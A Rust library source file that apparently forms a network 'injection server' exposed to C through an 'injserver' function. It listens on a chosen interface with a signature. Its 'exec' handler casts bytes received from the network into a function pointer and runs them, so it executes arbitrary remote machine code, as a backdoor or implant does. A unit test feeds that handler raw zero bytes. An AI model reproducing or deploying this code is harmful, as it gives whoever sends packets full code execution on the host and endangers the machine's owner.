use std::{process::Command, sync::Arc};
use std::os::raw::{c_char, c_uchar, c_int};
use kex_domain::{Entitys::{Envent::EventEmitter, Payload}, Enums::tp_enum};
use kex_infra::{dto::ServerOptions::ServerOptions, server::{response, server}};

pub use kex_infra::dto;
pub use kex_domain;
pub use kex_infra;
pub enum Method {
    Echo = 0,
    Exec = 1,    
}

pub fn echo(data: Vec<u8>, _addr: std::net::Ipv4Addr) {
    let data_str = String::from_utf8(data.clone());

    match data_str {
        Ok(data) => {
            println!("Echo: {:?}", data);
        }
        Err(_) => {
            println!("Echo: {:?}", &data);
        }        
    }
}

pub fn exec(data: Vec<u8>, _addr: std::net::Ipv4Addr){     
     if data.len() % std::mem::size_of::<usize>() != 0 {
        return;
    }
    
    let data = unsafe { data.align_to::<usize>().1 };
    let func: fn() = unsafe { std::mem::transmute(data.as_ptr()) };    
    func();    
}
pub fn init(args: ServerOptions) {  
    if cfg!(debug_assertions) {
            
        let evet_emitter = Arc::new(EventEmitter::new());
        evet_emitter.on(Method::Exec as u8, Box::new(exec));       
        evet_emitter.on(Method::Echo as u8, Box::new(echo));      
        server(args, evet_emitter);
    }
}

pub fn list_ifaces() {
    kex_infra::server::iface_list()
}

pub fn request(options: dto::ClientOptions::ClientOptions) {        
    kex_infra::client::request(options)
}

#[no_mangle]
pub extern "C" fn injserver(interface_name: *const c_char, interface_name_len: c_int, sig: *const u8, sig_len: usize, tp: c_int)->c_int {
    if cfg!(debug_assertions) {
        let interface_name = unsafe { std::slice::from_raw_parts(interface_name as *const c_uchar, interface_name_len as usize) };
        let interface_name = String::from_utf8(interface_name.to_vec()).unwrap();
        let sig = unsafe { std::slice::from_raw_parts(sig, sig_len) };
        let sig = sig.to_vec();
        let tp =tp as u8;

        let args = ServerOptions {
            interface_name,
            sig,
            tp
        };
        init(args);
    }
    0
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;
    use std::sync::Arc;
    use kex_domain::Entitys::Envent::EventEmitter;
    use kex_infra::dto::ServerOptions::ServerOptions;
    use kex_infra::dto::ClientOptions::ClientOptions;
    #[test]
    fn test_echo() {
        let data = vec![1, 2, 3, 4, 5];
        echo(data, Ipv4Addr::new(127, 0, 0, 1));
    }

    #[test]
    fn test_exec() {
        let data = vec![0, 0, 0, 0, 0, 0, 0, 0];
        exec(data, Ipv4Addr::new(127, 0, 0, 1));
    }        
}